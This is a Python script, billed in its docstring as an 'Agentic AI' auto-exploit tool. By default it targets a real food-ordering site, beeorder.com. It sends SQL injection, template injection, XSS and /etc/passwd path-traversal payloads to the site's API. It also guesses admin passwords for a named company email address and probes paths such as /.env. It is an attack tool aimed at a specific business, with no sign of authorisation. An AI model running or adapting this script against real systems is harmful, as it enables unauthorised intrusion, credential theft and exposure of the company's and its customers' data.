#!/usr/bin/env python3
"""
🤖 Agentic AI v3 - Auto Exploit
يكتشف ويستغل الثغرات تلقائياً
"""
import requests, sys, json, os, re, random, time, socket, base64
from datetime import datetime
from urllib.parse import urlparse

class AgenticAIV3:
    def __init__(self, target):
        self.target = target
        self.domain = urlparse(target).netloc
        self.findings = []
        self.exploits = []
        self.session = requests.Session()
    
    def log(self, msg): print(f"[🤖] {msg}")
    
    def observe_and_attack(self):
        """يراقب ويهاجم تلقائياً"""
        self.log(f"🤖 Agentic AI v3: {self.target}")
        self.log("═" * 60)
        
        attacks = [
            self.attack_sqli,
            self.attack_ssti,
            self.attack_xss,
            self.attack_lfi,
            self.attack_default_login,
            self.attack_api,
            self.attack_paths,
        ]
        
        for attack in attacks:
            try:
                attack()
            except:
                pass
            time.sleep(0.5)
        
        # تقرير
        self.log(f"\n📊 Exploits: {len(self.exploits)}")
        for ex in self.exploits:
            self.log(f"   🚨 {ex}")
        
        # حفظ
        os.makedirs("logs/agentic", exist_ok=True)
        fname = f"logs/agentic/v3_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(fname, 'w') as f:
            json.dump({"target":self.target,"exploits":self.exploits}, f, indent=2)
        self.log(f"📁 {fname}")
    
    def attack_sqli(self):
        self.log("💉 SQLi...")
        for p in ["' OR '1'='1", "admin'--", "1' OR 1=1--"]:
            r = self.session.get(f"{self.target}/api/stores?q={p}", timeout=5)
            if "error" in r.text.lower() or "sql" in r.text.lower():
                self.exploits.append(f"SQLi: {p}")
                self.log(f"   🚨 SQLi: {p}")
                break
    
    def attack_ssti(self):
        self.log("🧠 SSTI...")
        r = self.session.get(f"{self.target}/api/stores?q={{{{7*7}}}}", timeout=5)
        if "49" in r.text:
            self.exploits.append("SSTI: {{7*7}} = 49")
            self.log("   🚨 SSTI")
    
    def attack_xss(self):
        self.log("🔮 XSS...")
        p = "<script>alert(1)</script>"
        r = self.session.get(f"{self.target}/api/stores?q={p}", timeout=5)
        if p in r.text:
            self.exploits.append("XSS")
            self.log("   🚨 XSS")
    
    def attack_lfi(self):
        self.log("📁 LFI...")
        for p in ["../../../etc/passwd", "....//....//....//etc/passwd"]:
            r = self.session.get(f"{self.target}/api/stores?q={p}", timeout=5)
            if "root:" in r.text and "html" not in r.text:
                self.exploits.append(f"LFI: {p}")
                self.log(f"   🚨 LFI: {p}")
                break
    
    def attack_default_login(self):
        self.log("🔑 Default Login...")
        creds = [("admin@beeorder.com","admin"),("admin@beeorder.com","password"),("admin@beeorder.com","BeeOrder@2025")]
        for user, pwd in creds:
            r = self.session.post(f"{self.target}/admin/login",
                data={"email":user,"password":pwd}, timeout=5)
            if r.status_code == 200 and "error" not in r.text.lower():
                self.exploits.append(f"Login: {user}:{pwd}")
                self.log(f"   🚨🚨🚨 {user}:{pwd}")
                break
    
    def attack_api(self):
        self.log("💎 API...")
        for path in ["/api/stores","/api/users","/api/products"]:
            r = self.session.get(f"{self.target}{path}", timeout=3)
            if r.status_code == 200 and len(r.text) > 50:
                self.exploits.append(f"API: {path} ({len(r.text)} bytes)")
                self.log(f"   🚨 {path}")
    
    def attack_paths(self):
        self.log("🔍 Paths...")
        for path in ["/admin","/admin/login","/.env","/robots.txt"]:
            r = self.session.get(f"{self.target}{path}", timeout=3, allow_redirects=False)
            if r.status_code in [200,302]:
                self.exploits.append(f"Path: {path} ({r.status_code})")
                self.log(f"   🚨 {path}")

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "https://beeorder.com"
    AgenticAIV3(target).observe_and_attack()
